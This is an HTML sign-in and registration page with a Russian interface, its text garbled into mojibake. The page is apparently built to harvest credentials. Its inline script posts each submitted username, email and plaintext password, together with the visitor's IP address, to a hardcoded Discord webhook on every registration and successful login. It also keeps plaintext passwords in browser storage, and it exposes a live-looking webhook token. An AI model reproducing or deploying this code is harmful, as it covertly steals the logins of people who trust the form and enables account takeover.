<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–í—Ö–æ–¥ –∏ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å</h1>
            <p>–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–æ–π–¥–∏—Ç–µ –∏–ª–∏ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–π—Ç–µ—Å—å</p>
        </div>
        
        <div class="form-container">
            <div class="tabs">
                <button class="tab-btn active" data-tab="login">–í—Ö–æ–¥</button>
                <button class="tab-btn" data-tab="register">–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</button>
            </div>
            
            <div class="tab-content">
                <!-- –§–æ—Ä–º–∞ –≤—Ö–æ–¥–∞ -->
                <form id="login-form" class="form active">
                    <div class="input-group">
                        <input type="text" id="login-credential" required>
                        <label for="login-credential">–ù–∏–∫–Ω–µ–π–º –∏–ª–∏ –ø–æ—á—Ç–∞</label>
                    </div>
                    <div class="input-group">
                        <input type="password" id="login-password" required>
                        <label for="login-password">–ü–∞—Ä–æ–ª—å</label>
                    </div>
                    <button type="submit" class="submit-btn">–í–æ–π—Ç–∏</button>
                    <div class="message" id="login-message"></div>
                </form>
                
                <!-- –§–æ—Ä–º–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ -->
                <form id="register-form" class="form">
                    <div class="input-group">
                        <input type="text" id="register-username" required>
                        <label for="register-username">–ù–∏–∫–Ω–µ–π–º</label>
                    </div>
                    <div class="input-group">
                        <input type="email" id="register-email" required>
                        <label for="register-email">–ü–æ—á—Ç–∞</label>
                    </div>
                    <div class="input-group">
                        <input type="password" id="register-password" required>
                        <label for="register-password">–ü–∞—Ä–æ–ª—å</label>
                    </div>
                    <div class="input-group">
                        <input type="password" id="register-confirm" required>
                        <label for="register-confirm">–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –ø–∞—Ä–æ–ª—è</label>
                    </div>
                    <button type="submit" class="submit-btn">–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è</button>
                    <div class="message" id="register-message"></div>
                </form>
            </div>
        </div>
        
        <div class="footer">
            <p>¬© 2023 –í—Å–µ –ø—Ä–∞–≤–∞ –∑–∞—â–∏—â–µ–Ω—ã</p>
        </div>
    </div>

    <script>
        // –≠–ª–µ–º–µ–Ω—Ç—ã DOM
        const tabBtns = document.querySelectorAll('.tab-btn');
        const forms = document.querySelectorAll('.form');
        const loginForm = document.getElementById('login-form');
        const registerForm = document.getElementById('register-form');
        const loginMessage = document.getElementById('login-message');
        const registerMessage = document.getElementById('register-message');
        
        // –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ –º–µ–∂–¥—É —Ñ–æ—Ä–º–∞–º–∏
        tabBtns.forEach(btn => {
            btn.addEventListener('click', () => {
                const tab = btn.dataset.tab;
                
                // –ê–∫—Ç–∏–≤–∞—Ü–∏—è –∫–Ω–æ–ø–∫–∏
                tabBtns.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                
                // –ü–æ–∫–∞–∑ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–µ–π —Ñ–æ—Ä–º—ã
                forms.forEach(form => form.classList.remove('active'));
                document.getElementById(`${tab}-form`).classList.add('active');
            });
        });
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è IP-–∞–¥—Ä–µ—Å–∞
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è IP:', error);
                return '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π IP';
            }
        }
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –≤ Discord
        async function sendToDiscordWebhook(userData, type) {
            const webhookURL = 'https://discord.com/api/webhooks/1410467168209866833/h2jQSv-qFZF5Rk1jWE4xSiTwmXxNbnxOgcjWceBxx-1lEv9QB7WVhPeTSMHnL9H4ej_y';
            
            const ip = await getIPAddress();
            const timestamp = new Date().toLocaleString('ru-RU');
            
            let content = '';
            
            if (type === 'register') {
                content = `üîî **–ù–æ–≤–∞—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è**\nüìÖ ${timestamp}\nüåê IP-–∞–¥—Ä–µ—Å: ${ip}\nüë§ –ù–∏–∫–Ω–µ–π–º: ${userData.username}\nüìß Email: ${userData.email}\nüîë –ü–∞—Ä–æ–ª—å: ${userData.password}`;
            } else if (type === 'login') {
                content = `üîì **–ù–æ–≤—ã–π –≤—Ö–æ–¥**\nüìÖ ${timestamp}\nüåê IP-–∞–¥—Ä–µ—Å: ${ip}\nüë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${userData.credential}\nüîë –ü–∞—Ä–æ–ª—å: ${userData.password}`;
            }
            
            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ content }),
                });
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Discord:', error);
            }
        }
        
        // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏
        registerForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('register-username').value;
            const email = document.getElementById('register-email').value;
            const password = document.getElementById('register-password').value;
            const confirm = document.getElementById('register-confirm').value;
            
            // –í–∞–ª–∏–¥–∞—Ü–∏—è
            if (password !== confirm) {
                showMessage(registerMessage, '–ü–∞—Ä–æ–ª–∏ –Ω–µ —Å–æ–≤–ø–∞–¥–∞—é—Ç', 'error');
                return;
            }
            
            if (password.length < 6) {
                showMessage(registerMessage, '–ü–∞—Ä–æ–ª—å –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å –Ω–µ –º–µ–Ω–µ–µ 6 —Å–∏–º–≤–æ–ª–æ–≤', 'error');
                return;
            }
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
            const users = JSON.parse(localStorage.getItem('users') || '[]');
            if (users.find(user => user.username === username)) {
                showMessage(registerMessage, '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å —Ç–∞–∫–∏–º –∏–º–µ–Ω–µ–º —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç', 'error');
                return;
            }
            
            if (users.find(user => user.email === email)) {
                showMessage(registerMessage, '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å —Ç–∞–∫–æ–π –ø–æ—á—Ç–æ–π —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç', 'error');
                return;
            }
            
            // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            users.push({ username, email, password });
            localStorage.setItem('users', JSON.stringify(users));
            
            // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Discord
            await sendToDiscordWebhook({ username, email, password }, 'register');
            
            showMessage(registerMessage, '–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ! –¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –≤–æ–π—Ç–∏.', 'success');
            registerForm.reset();
            
            // –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ –Ω–∞ —Ñ–æ—Ä–º—É –≤—Ö–æ–¥–∞
            setTimeout(() => {
                document.querySelector('[data-tab="login"]').click();
            }, 2000);
        });
        
        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –≤—Ö–æ–¥–∞
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const credential = document.getElementById('login-credential').value;
            const password = document.getElementById('login-password').value;
            
            // –ü–æ–∏—Å–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            const users = JSON.parse(localStorage.getItem('users') || '[]');
            const user = users.find(user => 
                (user.username === credential || user.email === credential) && 
                user.password === password
            );
            
            if (user) {
                // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Discord
                await sendToDiscordWebhook({ credential, password }, 'login');
                
                showMessage(loginMessage, `–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, ${user.username}!`, 'success');
                loginForm.reset();
                
                // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Ç–µ–∫—É—â–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ —Å–µ—Å—Å–∏–∏
                localStorage.setItem('currentUser', JSON.stringify(user));
            } else {
                showMessage(loginMessage, '–ù–µ–≤–µ—Ä–Ω—ã–µ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ', 'error');
            }
        });
        
        // –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–∫–∞–∑–∞ —Å–æ–æ–±—â–µ–Ω–∏–π
        function showMessage(element, text, type) {
            element.textContent = text;
            element.className = `message ${type}`;
            element.style.display = 'block';
            
            // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ —Å–∫—Ä—ã—Ç–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
            setTimeout(() => {
                element.style.display = 'none';
            }, 5000);
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è —Ç–µ–∫—É—â–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.addEventListener('DOMContentLoaded', () => {
            const currentUser = JSON.parse(localStorage.getItem('currentUser') || 'null');
            if (currentUser) {
                showMessage(loginMessage, `–° –≤–æ–∑–≤—Ä–∞—â–µ–Ω–∏–µ–º, ${currentUser.username}!`, 'success');
            }
        });
    </script>
</body>
</html>